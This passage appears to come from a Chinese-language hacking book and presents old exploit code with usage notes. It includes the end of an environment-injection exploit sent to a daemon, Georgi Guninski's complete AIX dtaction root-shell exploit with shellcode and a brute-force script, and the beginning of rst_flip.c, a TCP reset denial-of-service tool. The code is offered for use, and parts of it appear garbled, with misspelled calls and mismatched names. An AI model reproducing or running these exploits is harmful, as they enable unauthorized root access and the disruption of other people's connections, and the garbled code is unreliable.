

```c
sprintf (buffer, "NLSPATH=%s", getenv("NLSPATH"));
send_environ (buffer, param);

sprintf (buffer, "PATH=%s", getenv("PATH"));
send_environ (buffer, param);

sprintf (buffer, "%s", "EDITOR=emacs");
send_environ (buffer, param);

sprintf (buffer, "LOGNAME=%s", LOGIN);
send_environ (buffer, param);

sprintf (buffer, "MAIL=/usr/spool/mail/%s", LOGIN);
send_environ (buffer, param);

sprintf (buffer, "HOSTNAME=%s", getenv("HOSTNAME"));
send_environ (buffer, param);

sprintf (buffer, "LOCPATH=%s", getenv("LOCPATH"));
send_environ (buffer, param);

sprintf (buffer, "%s", "PS1=(exploited !) ");
send_environ (buffer, param);

sprintf (buffer, "USER=%s", LOGIN);
send_environ (buffer, param);

sprintf (buffer, "AUTHSTATE=%s", getenv("AUTHSTATE"));
send_environ (buffer, param);

sprintf (buffer, "DISPLAY=%s", getenv("DISPLAY"));
send_environ (buffer, param);

sprintf (buffer, "SHELL=%s", getenv("SHELL"));
send_environ (buffer, param);

sprintf (buffer, "%s", "ODMDIR=/etc/objrepos");
send_environ (buffer, param);

sprintf (buffer, "HOME=%s", HOME);
send_environ (buffer, param);

sprintf (buffer, "%s", "TERM=vt220");
send_environ (buffer, param);

sprintf (buffer, "%s", "MAILMSG=[YOU HAVE NEW MAIL]");
send_environ (buffer, param);
        sprintf (buffer, "PWD=%s", PWD);
send_environ (buffer, param);

sprintf (buffer, "%s", "T2=NFT-1");
send_environ (buffer, param);

sprintf (buffer, "%s", "A__z=! LOGNAME");
```

498

```c
send_environ(buffer,param);

/* 使用 -q 参数启动 info_gr，否则进程将在本地运行
   而不是从守护进程运行 ...  */

sprintf(buffer,"%%%c%%%c%%%c",1,45,113,0);
fwrite(buffer,1,4,param);

fclose(param);

param=fopen("/tmp/tempo.fun","rb");
fseek(param,0,SEEK_END);
taille_param=ftell(param);
fseek(param,0,SEEK_SET);
fread(paramz,1,taille_param,param);
fclose(param);

unlink("/tmp/tempo.fun");

/* 感谢守护进程先生 :) */

write(chaussette,paramz,taille_param);

printf("\n%s %s\n",OK,getenv("HOSTNAME"));

close(chaussette);
}
```

本章中的程序可以在随本书附赠的光盘中找到。

## 远程 root

*摘要：* AIX *dtaction* 和 *home 环境处理* 存在远程 root shell 漏洞。

*黑客状态：* 未授权的 root 访问。

*易受攻击性：* AIX 4.2。

*攻击方式：* 使用 UNIX 专家 Georgi Guninski 编写的 *aixdttaction.c*，AIX 4.2 中的 */usr/dt/bin/dtaction* 进程会处理“Home”环境，从而生成一个 root shell。

## aixdtaction.c

```c
/* 使用 IBM C 编译器。
   编译方式：cc -g aixdtaction.c
   DISPLAY 应已设置。
   -----------------
   Georgi Guninski
   guninski@hotmail.com
   http://www.geocities.com/ResearchTriangle/1711
   */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char *prog="/usr/dt/bin/dtaction";
char *prog2="dtaction";
extern int execv();

char *createvar(char *name,char *value)
{
char *c;
int l;
l=strlen(name)+strlen(value)+4;
if (! (c=malloc(l))) {perror("error allocating");exit(2);} ;
strcpy(c,name);
strcat(c,"=");
strcat(c,value);
return c;
}

/*程序本体*/
main(int argc,char **argv,char **env)
{
/*代码部分*/
unsigned int code[]={
0x7c0802a6 , 0x9421fbb0 , 0x90010458 , 0x3c60f019 ,
0x60632c48 , 0x90610440 , 0x3c60d002 , 0x60634c0c ,
0x90610444 , 0x3c602f62 , 0x6063696e , 0x90610438 ,
0x3c602f73 , 0x60636801 , 0x3863ffff , 0x9061043c ,
0x30610438 , 0x7c842278 , 0x80410440 , 0x80010444 ,
0x7c0903a6 , 0x4e800420 , 0x0}
};
/* 反汇编
7c0802a6      mfspr   r0,LR
9421fbb0      st      SP,-1104(SP) --获取栈
90010458      st      r0,1112(SP)
3c60f019      cau     r3,r0,0xf019
60632c48      lis     r3,r3,11336
90610440      st      r3,1088(SP)
3c60d002      cau     r3,r0,0xd002

60634c0c      lis     r3,r3,19468
90610444      st      r3,1092(SP)
3c602f62      cau     r3,r0,0x2f62 --'/bin/sh\x01'
6063696e      lis     r3,r3,26990
90610438      st      r3,1080(SP)
3c602f73      cau     r3,r0,0x2f73
60636801      lis     r3,r3,26625
3863ffff      addi    r3,r3,-1
9061043c      st      r3,1084(SP) --以 0 终止
30610438      lis     r3,SP,1080
7c842278      xor     r4,r4,r4      --argv=NULL
80410440      lwz     RTOC,1088(SP)
80010444      lwz     r0,1092(SP)  --跳转
7c0903a6      mtspr   CTR,r0
4e800420        bctr      --跳转
*/
#define MAXBUF 600
unsigned int buf[MAXBUF];
unsigned int frame[MAXBUF];
unsigned int i,nop,mn=100;
int max=280;
unsigned int toc;
unsigned int eco;
unsigned int *pt;
char *t;
unsigned int reta; /* 返回地址 */
int corr=3400;
char *args[4];
char *newenv[8];

if (argc>1)
      corr = atoi(argv[1]);

pt=(unsigned *) &execv;
toc=*(pt+1);
eco=*pt;

if (  (mn+strlen( (char*)code) /4)>max) || (max>MAXBUF )
{
      perror("Bad parameters");
      exit(1);
}

#define OO 7
*((unsigned short *)code + OO + 2)=(unsigned short) (toc & 0x0000ffff);
*((unsigned short *)code + OO)=(unsigned short) ((toc >> 16) & 0x0000ffff);

*((unsigned short *)code + OO + 8 )=(unsigned short) (eco & 0x0000ffff);
*((unsigned short *)code + OO + 6 )=(unsigned short) ((eco >> 16) & 0x0000ffff);

reta=(unsigned) &buf[0]+corr;

for(nop=0; nop<mn; nop++)
   buf[nop]=0x4fffffb82;
strcpv( (char*)&buf[nop], (char*)&code);
i=nop+strlen( (char*) &code)/4-1;

if( !(reta & 0xff) || !(reta && 0xfff0) || !(reta & 0xfff0000)
         || !(reta && 0xfff00000))
{
  perror("Return address has zero");exit(5);
}
    while(i++<max)
      buff[i]=reta;
    buff[i]=0;
    for(i=0;i<max-1;i++)
      frame[i]=reta;
    frame[i]=0;

    /* 4 个变量，因为正确的那个应该对齐到 4 字节边界
    ry */
    newenv[0]=createvar("EGGSHEL",(char*)&buff[0]);
    newenv[1]=createvar("EGGSHE2",(char*)&buff[0]);
    newenv[2]=createvar("EGGSHE3",(char*)&buff[0]);
    newenv[3]=createvar("EGGSHE4",(char*)&buff[0]);
    newenv[4]=createvar("DISPLAY",getenv("DISPLAY"));
    newenv[5]=createvar("HOME",(char*)&frame[0]);
    newenv[6]=NULL;
    args[0]=prog2;
    puts("Start... ");/*开始*/
    execve(prog,args,newenv);
    perror("Error executing execve \n");
    /*          Georgi Guninski guninski@hotmail.com
            http://www.geocities.com/ResearchTriangle/1711*/
}
```

```bash
#!/bin/ksh
L=200
O=40
while [ $L -lt 12000 ]
do
    echo $L
    L=`expr $L + 96`
    ./a.out $L
done
```

## **BSD**

BSD 操作系统，通常被称为 UNIX 的 Berkeley 版本，存在多种变体，并广泛用于互联网服务和防火墙。BSD 通常运行在 Intel 和 Sun 架构上，可以提供高性能的互联网操作系统，用于 DNS、Web 托管、电子邮件、安全、VPN 访问等诸多领域。BSD 产品系列基于由 Berkeley Software Design, Inc. 开发的核心源代码，包括 BSDi、FreeBSD、NetBSD 和 OpenBSD 等版本。BSDi (www.bsd.com) 以其互联网基础设施级系统著称，其软件和解决方案背后有着一流的服务和支持。

## **责任范围/风险**

### 拒绝服务攻击

**摘要：** BSD 易受 DoS 攻击；通过发送定制数据包来断开活动的 TCP 连接。

**黑客状态：** 严重拥塞。

**易受攻击性：** BSD 的各种变体。

**攻击方式：** 使用方法相当简单：

```
`rst_flip <A> <B> <A port low> <A port hi> <B port low> <B port hi>`
其中
A 和 B 是目标当前的会话。
```

## rst_flip.c

```c
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <linux/socket.h>
#include <linux/ip.h>
#include <linux/tcp.h>

#define TCPHDR    sizeof(struct tcphdr)
#define IPHDR     sizeof(struct iphdr)
#define PACKETSIZE TCPHDR + IPHDR
#define SLEEPTIME 30000             // 取决于你能多快地“呕吐”（发送数据）
#define LO_RST    1                 // 发出的数据包
#define HI_RST    2147483647        // 别问我关于这个 :)
#define ERROR_FAILURE -1

#define ERROR_SUCCESS 0

void resolve_address(struct sockaddr *, char *, u_short);
unsigned short in_cksum(unsigned short *,int );
int send_rst(char *, char *, u_short ,u_short , u_long, u_long,u_long);

int main(int argc, char *argv[])
{
   int res,i,j;
   int spoof_port,target_port;

   if (argc < 7 || argc> 8 )
   {
      printf ("usage: <source> <destination> <source_port_hi>
<source_port_lo> <dest_port_hi> <dest_port_lo>\n[
http://www.rootshell.com/ \n");
      exit(ERROR_FAILURE);
   }

   for (i = atoi(argv[3]);i <= atoi(argv[4]); i++)
   {
```

503

